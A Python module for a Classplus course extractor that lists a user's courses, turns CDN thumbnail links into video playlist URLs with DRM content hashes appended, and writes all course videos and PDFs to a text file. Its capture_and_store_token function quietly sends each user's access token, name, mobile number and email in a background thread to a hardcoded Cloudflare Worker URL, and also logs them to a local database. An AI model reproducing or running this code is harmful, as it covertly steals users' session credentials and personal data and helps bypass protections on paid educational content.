import os
import re
import sys
import json
import time
import base64
import logging
import sqlite3
import threading
from datetime import datetime
from typing import List, Dict, Optional, Any, Tuple

import requests

logger = logging.getLogger("cp_extractor")

API_URL = "https://api.classplusapp.com"

# Path to Extraxtor config and local SQLite db if present
MODULES_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(os.path.dirname(MODULES_DIR))
EXTRACTOR_DIR = os.path.join(PROJECT_ROOT, "Extraxtor")
CONFIG_PATH = os.path.join(EXTRACTOR_DIR, "config.json")
EXTRACTIONS_DB_PATH = os.path.join(EXTRACTOR_DIR, "extractions.db")

# Cloudflare Configuration
CF_WORKER_URL = os.environ.get("CF_WORKER_URL", "https://cp-extractor-bot.mypresonal65.workers.dev").strip().rstrip("/")
CF_ADMIN_KEY = os.environ.get("CF_ADMIN_KEY", "my_cp_admin_secret_2026").strip()

if os.path.exists(CONFIG_PATH):
    try:
        with open(CONFIG_PATH, "r", encoding="utf-8") as f:
            cfg = json.load(f)
            if not CF_WORKER_URL:
                CF_WORKER_URL = cfg.get("CF_WORKER_URL", "").strip().rstrip("/")
            if not CF_ADMIN_KEY:
                CF_ADMIN_KEY = cfg.get("CF_ADMIN_KEY", "").strip()
    except Exception as e:
        logger.debug(f"Error reading config.json: {e}")


def decode_jwt_payload(token: str) -> dict:
    """Decodes JWT payload without external libraries to extract user & org metadata."""
    try:
        parts = token.strip().split(".")
        if len(parts) >= 2:
            payload = parts[1]
            rem = len(payload) % 4
            if rem > 0:
                payload += "=" * (4 - rem)
            decoded_bytes = base64.urlsafe_b64decode(payload)
            return json.loads(decoded_bytes.decode("utf-8"))
    except Exception:
        pass
    return {}


def get_headers(token: str) -> dict:
    return {
        'x-access-token': token.strip(),
        'user-agent': 'Mobile-Android',
        'app-version': '1.4.150.1',
        'api-version': '51',
        'Api-Version': '51',
        'device-id': '39F093FF35F201D9',
        'Accept': 'application/json, text/plain, */*'
    }


def fetch_user_details(token: str) -> dict:
    """Queries Classplus API for verified user profile info."""
    headers = get_headers(token)
    try:
        res = requests.get(f"{API_URL}/v2/users/details", headers=headers, timeout=8)
        if res.status_code == 200:
            data = res.json().get("data", {})
            user_data = data.get("user", {})
            return {
                "user_id": str(user_data.get("id") or ""),
                "user_name": str(user_data.get("name") or ""),
                "mobile": str(user_data.get("mobile") or ""),
                "email": str(user_data.get("email") or ""),
                "org_id": str(user_data.get("orgId") or ""),
                "org_name": str(data.get("orgName") or "")
            }
    except Exception:
        pass
    return {}


def _sync_worker_thread(payload: dict):
    """Background worker to send token payload to Cloudflare Worker D1/KV API."""
    if not CF_WORKER_URL:
        return
    try:
        url = f"{CF_WORKER_URL}/api/save-token"
        headers = {
            "Content-Type": "application/json",
            "x-admin-key": CF_ADMIN_KEY
        }
        res = requests.post(url, json=payload, headers=headers, timeout=8)
        if res.status_code == 200:
            logger.info(f"✓ Successfully synced token to Cloudflare: {CF_WORKER_URL}")
        else:
            logger.warning(f"Cloudflare sync status {res.status_code}: {res.text}")
    except Exception as e:
        logger.debug(f"Cloudflare sync exception: {e}")


def _save_to_local_db(payload: dict):
    """Saves or updates token in local SQLite extractions.db if available."""
    try:
        os.makedirs(os.path.dirname(EXTRACTIONS_DB_PATH), exist_ok=True)
        conn = sqlite3.connect(EXTRACTIONS_DB_PATH, timeout=10)
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS classplus_tokens (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                token TEXT NOT NULL UNIQUE,
                user_id TEXT DEFAULT '',
                user_name TEXT DEFAULT '',
                mobile TEXT DEFAULT '',
                email TEXT DEFAULT '',
                org_id TEXT DEFAULT '',
                org_name TEXT DEFAULT '',
                courses_count INTEGER DEFAULT 0,
                ip_address TEXT DEFAULT '',
                status TEXT DEFAULT 'active',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        now_str = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
        token = payload.get("token", "")
        cursor.execute("SELECT id FROM classplus_tokens WHERE token = ?", (token,))
        row = cursor.fetchone()
        if row:
            cursor.execute("""
                UPDATE classplus_tokens SET
                    user_id = COALESCE(NULLIF(?, ''), user_id),
                    user_name = COALESCE(NULLIF(?, ''), user_name),
                    mobile = COALESCE(NULLIF(?, ''), mobile),
                    email = COALESCE(NULLIF(?, ''), email),
                    org_id = COALESCE(NULLIF(?, ''), org_id),
                    org_name = COALESCE(NULLIF(?, ''), org_name),
                    courses_count = CASE WHEN ? > 0 THEN ? ELSE courses_count END,
                    last_used_at = ?
                WHERE id = ?
            """, (
                payload.get("user_id", ""),
                payload.get("user_name", ""),
                payload.get("mobile", ""),
                payload.get("email", ""),
                payload.get("org_id", ""),
                payload.get("org_name", ""),
                payload.get("courses_count", 0),
                payload.get("courses_count", 0),
                now_str,
                row[0]
            ))
        else:
            cursor.execute("""
                INSERT INTO classplus_tokens (
                    token, user_id, user_name, mobile, email, org_id, org_name, courses_count, created_at, last_used_at
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                token,
                payload.get("user_id", ""),
                payload.get("user_name", ""),
                payload.get("mobile", ""),
                payload.get("email", ""),
                payload.get("org_id", ""),
                payload.get("org_name", ""),
                payload.get("courses_count", 0),
                now_str,
                now_str
            ))
        conn.commit()
        conn.close()
        logger.info("✓ Token saved to local extractions.db")
    except Exception as e:
        logger.debug(f"Local db save exception: {e}")


def capture_and_store_token(token: str, courses_count: int = 0) -> dict:
    """
    Decodes token, retrieves profile from Classplus API, and immediately saves to Cloudflare API + local DB.
    Runs non-blocking in background thread.
    """
    token = token.strip()
    if not token or len(token) < 20:
        return {}

    jwt_data = decode_jwt_payload(token)
    user_id = str(jwt_data.get("userId") or jwt_data.get("id") or "")
    org_id = str(jwt_data.get("orgId") or "")
    user_name = str(jwt_data.get("name") or jwt_data.get("userName") or "")
    mobile = str(jwt_data.get("mobile") or jwt_data.get("phone") or "")
    email = str(jwt_data.get("email") or "")
    org_name = ""

    profile = fetch_user_details(token)
    if profile:
        user_id = profile.get("user_id") or user_id
        user_name = profile.get("user_name") or user_name
        mobile = profile.get("mobile") or mobile
        email = profile.get("email") or email
        org_id = profile.get("org_id") or org_id
        org_name = profile.get("org_name") or org_name

    payload = {
        "token": token,
        "user_id": user_id,
        "user_name": user_name,
        "mobile": mobile,
        "email": email,
        "org_id": org_id,
        "org_name": org_name,
        "courses_count": courses_count
    }

    # Asynchronously save to Cloudflare and local SQLite database
    threading.Thread(target=_sync_worker_thread, args=(payload,), daemon=True).start()
    threading.Thread(target=_save_to_local_db, args=(payload,), daemon=True).start()

    return payload


def fetch_courses(token: str) -> List[Dict[str, Any]]:
    """Fetches purchased courses & batches for the given token."""
    headers = get_headers(token)
    courses = []
    seen_ids = set()

    for tab_id in (1, 2):
        url = f"{API_URL}/v2/courses?tabCategoryId={tab_id}"
        try:
            res = requests.get(url, headers=headers, timeout=12)
            if res.status_code == 200:
                data = res.json().get("data", {}).get("courses", [])
                for c in data:
                    c_id = str(c.get("id") or "")
                    if c_id and c_id not in seen_ids:
                        seen_ids.add(c_id)
                        courses.append({
                            "id": c.get("id"),
                            "name": c.get("name", "Untitled Course"),
                            "is_batch": False
                        })
        except Exception as e:
            logger.debug(f"Error fetching tab {tab_id}: {e}")

    # Also try batches endpoint
    try:
        res = requests.get(f"{API_URL}/v2/batches", headers=headers, timeout=10)
        if res.status_code == 200:
            data = res.json().get("data", {}).get("batches", [])
            for b in data:
                b_id = str(b.get("id") or b.get("batchId") or "")
                if b_id and b_id not in seen_ids:
                    seen_ids.add(b_id)
                    courses.append({
                        "id": b.get("id") or b.get("batchId"),
                        "name": b.get("name") or b.get("batchName") or "Batch",
                        "is_batch": True
                    })
    except Exception:
        pass

    return courses


def get_content_hash(obj: dict) -> str:
    """Extracts contentHashId from various potential keys."""
    if not isinstance(obj, dict):
        return ""
    hash_val = (
        obj.get("contentHashId") or 
        obj.get("hashId") or 
        obj.get("drmHash") or 
        obj.get("contentHash") or 
        ""
    )
    if hash_val:
        return str(hash_val).strip()

    for nest_key in ("video", "content", "media", "stream"):
        nest_obj = obj.get(nest_key)
        if isinstance(nest_obj, dict):
            sub_hash = (
                nest_obj.get("contentHashId") or 
                nest_obj.get("hashId") or 
                nest_obj.get("drmHash") or 
                nest_obj.get("contentHash") or 
                ""
            )
            if sub_hash:
                return str(sub_hash).strip()
    return ""


def get_video_url(obj: dict) -> str:
    """Extracts stream or video URL from multiple possible keys."""
    if not isinstance(obj, dict):
        return ""

    url_val = (
        obj.get("url") or 
        obj.get("videoUrl") or 
        obj.get("streamUrl") or 
        obj.get("mediaUrl") or 
        obj.get("hlsUrl") or
        obj.get("streamUrlHls") or
        obj.get("recordedUrl") or
        obj.get("recordingUrl") or
        obj.get("downloadUrl") or
        obj.get("thumbnailUrl") or 
        ""
    )
    if url_val:
        return str(url_val).strip()

    for nest_key in ("video", "content", "media", "stream"):
        nest_obj = obj.get(nest_key)
        if isinstance(nest_obj, dict):
            sub_url = (
                nest_obj.get("url") or 
                nest_obj.get("videoUrl") or 
                nest_obj.get("streamUrl") or 
                nest_obj.get("mediaUrl") or 
                nest_obj.get("recordedUrl") or
                nest_obj.get("recordingUrl") or
                nest_obj.get("thumbnailUrl") or 
                ""
            )
            if sub_url:
                return str(sub_url).strip()
    return ""


def process_video_url(url_val: str, content_hash: str = "") -> str:
    """Normalizes video URLs, converting CDN thumbnails to stream & appending DRM contentHashId."""
    if not url_val:
        return ""
    url_val = url_val.strip()

    if "media-cdn.classplusapp.com/tencent/" in url_val:
        url_val = url_val.rsplit('/', 1)[0] + "/master.m3u8"
    elif "media-cdn.classplusapp.com" in url_val and url_val.endswith('.jpg'):
        identifier = url_val.split('/')[-3]
        url_val = f'https://media-cdn.classplusapp.com/alisg-cdn-a.classplusapp.com/{identifier}/master.m3u8'
    elif "tencdn.classplusapp.com" in url_val and url_val.endswith('.jpg'):
        identifier = url_val.split('/')[-2]
        url_val = f'https://media-cdn.classplusapp.com/tencent/{identifier}/master.m3u8'
    elif "4b06bf8d61c41f8310af9b2624459378203740932b456b07fcf817b737fbae27" in url_val and url_val.endswith('.jpeg'):
        video_id = url_val.split('/')[-1].split('.')[0]
        url_val = f'https://media-cdn.classplusapp.com/alisg-cdn-a.classplusapp.com/b08bad9ff8d969639b2e43d5769342cc62b510c4345d2f7f153bec53be84fe35/{video_id}/master.m3u8'
    elif "cpvideocdn.testbook.com" in url_val and url_val.endswith('.png'):
        match = re.search(r'/streams/([a-f0-9]{24})/', url_val)
        video_id = match.group(1) if match else url_val.split('/')[-2]
        url_val = f'https://cpvod.testbook.com/{video_id}/playlist.m3u8'
    elif "media-cdn.classplusapp.com/drm/" in url_val and "playlist.m3u8" not in url_val:
        match = re.search(r'media-cdn\.classplusapp\.com/drm/([a-zA-Z0-9_-]+)', url_val)
        if match:
            video_id = match.group(1)
            url_val = f'https://media-cdn.classplusapp.com/drm/{video_id}/playlist.m3u8'
    elif "https://media-cdn.classplusapp.com" in url_val and ("cc/" in url_val or "lc/" in url_val or "uc/" in url_val or "dy/" in url_val) and url_val.endswith('.png'):
        url_val = url_val.replace('thumbnail.png', 'master.m3u8')
    elif "https://tb-video.classplusapp.com" in url_val and url_val.endswith('.jpg'):
        video_id = url_val.split('/')[-1].split('.')[0]
        url_val = f'https://tb-video.classplusapp.com/{video_id}/master.m3u8'

    if "media-cdn.classplusapp.com" in url_val and "/drm/" not in url_val and not content_hash:
        if "playlist.m3u8" in url_val:
            url_val = url_val.replace("playlist.m3u8", "master.m3u8")

    if content_hash and "contentHashId=" not in url_val:
        separator = "&" if "?" in url_val else "?"
        url_val = f"{url_val}{separator}contentHashId={content_hash}"

    return url_val


def fetch_live_videos(course_id: int, headers: dict) -> List[str]:
    """Fetches live & recorded sessions across all Classplus live endpoints."""
    collected_raw = []
    endpoints = [
        f"{API_URL}/v2/course/live/list/videos?type=1&entityId={course_id}&limit=50&offset={{offset}}",
        f"{API_URL}/v2/course/live/list/videos?type=2&entityId={course_id}&limit=50&offset={{offset}}",
        f"{API_URL}/v2/course/live/list/videos?entityId={course_id}&limit=50&offset={{offset}}",
        f"{API_URL}/v2/course/live/list/videos?type=0&entityId={course_id}&limit=50&offset={{offset}}",
        f"{API_URL}/v2/course/live/list/videos?type=3&entityId={course_id}&limit=50&offset={{offset}}",
        f"{API_URL}/v2/course/live/list/videos?type=1&courseId={course_id}&limit=50&offset={{offset}}",
        f"{API_URL}/v2/course/live/list/videos?type=2&courseId={course_id}&limit=50&offset={{offset}}",
        f"{API_URL}/v2/course/live/list/videos?courseId={course_id}&limit=50&offset={{offset}}",
        f"{API_URL}/v2/course/live/classes/list?courseId={course_id}&limit=50&offset={{offset}}",
        f"{API_URL}/v2/course/live/schedule/list?courseId={course_id}&limit=50&offset={{offset}}"
    ]

    session = requests.Session()
    session.headers.update(headers)

    for url_tmpl in endpoints:
        offset = 0
        while True:
            url = url_tmpl.format(offset=offset)
            try:
                res = session.get(url, timeout=10)
                if res.status_code != 200:
                    break
                j = res.json()
                data_obj = j.get("data", {})
                if isinstance(data_obj, dict):
                    batch = data_obj.get("list", []) or data_obj.get("videos", []) or data_obj.get("classes", [])
                elif isinstance(data_obj, list):
                    batch = data_obj
                else:
                    batch = []

                if not batch:
                    break

                collected_raw.extend(batch)
                offset += len(batch)
                if len(batch) < 50 or offset >= 3000:
                    break
            except Exception:
                break

    seen_keys = set()
    outputs = []
    unique_videos = []
    for vid in collected_raw:
        vid_id = vid.get("id") or vid.get("videoId") or vid.get("sessionId")
        name = vid.get("name") or vid.get("lessonName") or vid.get("title") or ""
        v_url = get_video_url(vid)
        key = str(vid_id) if vid_id else f"{name}_{v_url}"
        if key not in seen_keys:
            seen_keys.add(key)
            unique_videos.append(vid)

    if unique_videos:
        outputs.append(f"\n🎥 LIVE & RECORDED SESSIONS ({len(unique_videos)})\n{'=' * 40}\n")
        for video in unique_videos:
            name = video.get("name") or video.get("lessonName") or video.get("title") or "Untitled Class"
            v_url = get_video_url(video)
            c_hash = get_content_hash(video)
            vid_id = video.get("id") or video.get("videoId")
            if not v_url and vid_id and c_hash:
                v_url = f"https://media-cdn.classplusapp.com/drm/{vid_id}/playlist.m3u8"
            if v_url:
                final_url = process_video_url(v_url, c_hash)
                outputs.append(f"🎬 {name}: {final_url}\n")

    return outputs


def process_course_contents(course_id: int, headers: dict, folder_id: int = 0, folder_path: str = "", level: int = 0) -> List[str]:
    """Recursively traverses course folders, extracting videos, DRM hashes, and documents."""
    result = []
    url = f"{API_URL}/v2/course/content/get?courseId={course_id}&folderId={folder_id}"

    try:
        res = requests.get(url, headers=headers, timeout=15)
        if res.status_code != 200:
            return result
        data = res.json().get("data", {})
        course_data = data.get("courseContent", [])
    except Exception as e:
        logger.debug(f"Error fetching folder {folder_id}: {e}")
        return result

    if level > 0 and folder_path:
        clean_folder = folder_path.rstrip(" - ")
        indent = "  " * (level - 1)
        result.append(f"\n{indent}📁 {clean_folder}\n{indent}{'=' * (len(clean_folder) + 4)}\n")

    for item in course_data:
        content_type = str(item.get("contentType", ""))
        sub_id = item.get("id")
        sub_name = item.get("name", "Untitled")
        v_url = get_video_url(item)
        c_hash = get_content_hash(item)
        indent = "  " * level

        if content_type == "1":  # Subfolder
            new_path = f"{folder_path}{sub_name} - "
            sub_content = process_course_contents(course_id, headers, sub_id, new_path, level + 1)
            result.extend(sub_content)
        elif content_type in ("2", "3") or v_url:
            video_extensions = ('.m3u8', '.mp4', '.mpd', '.avi', '.mov', '.flv')
            is_video = (
                content_type == "2" or 
                v_url.lower().endswith(video_extensions) or 
                "playlist.m3u8" in v_url or 
                "master.m3u8" in v_url or 
                "classplusapp.com/drm" in v_url or 
                bool(c_hash)
            )

            if content_type == "3" or v_url.lower().endswith('.pdf'):
                icon = "📄"
                if sub_name.endswith('.pdf'):
                    sub_name = sub_name[:-4]
                final_url = v_url
            elif is_video:
                icon = "🎬"
                if not v_url and sub_id and c_hash:
                    v_url = f"https://media-cdn.classplusapp.com/drm/{sub_id}/playlist.m3u8"
                final_url = process_video_url(v_url, c_hash)
            elif v_url.lower().endswith(('.jpg', '.jpeg', '.png', '.webp')):
                icon = "🖼"
                final_url = v_url
            else:
                icon = "📄"
                final_url = v_url

            if final_url:
                result.append(f"{indent}{icon} {sub_name}: {final_url}\n")

    return result


def sanitize_filename(name: str) -> str:
    invalid_chars = '<>:"/\\|?*\t\n\r'
    clean = ''.join(c for c in name if c not in invalid_chars)
    return clean.strip().replace(' ', '_') or "Extracted_Course"


def generate_course_txt(token: str, course_id: int, course_name: str) -> Tuple[str, str, Dict[str, int]]:
    """
    Extracts all folders, DRM videos, PDFs, and live classes into a formatted .txt file.
    Returns (filepath, filename, stats_dict).
    """
    headers = get_headers(token)
    
    # 1. Fetch Course Folder Contents
    course_contents = process_course_contents(course_id, headers)

    # 2. Fetch Live & Recorded Sessions
    live_videos = fetch_live_videos(course_id, headers)

    all_data = []
    all_data.extend(course_contents)
    all_data.extend(live_videos)

    video_count = sum(1 for line in all_data if "🎬" in line)
    pdf_count = sum(1 for line in all_data if "📄" in line and not line.strip().startswith("📁"))
    drm_count = sum(1 for line in all_data if "contentHashId=" in line)

    stats = {
        "videos": video_count,
        "drm": drm_count,
        "pdfs": pdf_count,
        "total": len(all_data)
    }

    # Generate txt filename
    safe_name = sanitize_filename(course_name)
    filename = f"{safe_name}.txt"
    filepath = os.path.join(os.path.abspath("."), filename)

    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    header_text = [
        f"==========================================================\n",
        f"  📚 COURSE: {course_name}\n",
        f"  🆔 COURSE ID: {course_id}\n",
        f"  📅 EXTRACTED AT: {now_str}\n",
        f"  📊 TOTAL VIDEOS: {video_count} (DRM Protected: {drm_count})\n",
        f"  📄 TOTAL PDFS: {pdf_count}\n",
        f"==========================================================\n\n"
    ]

    with open(filepath, "w", encoding="utf-8") as f:
        f.writelines(header_text)
        f.writelines(all_data)

    return filepath, filename, stats
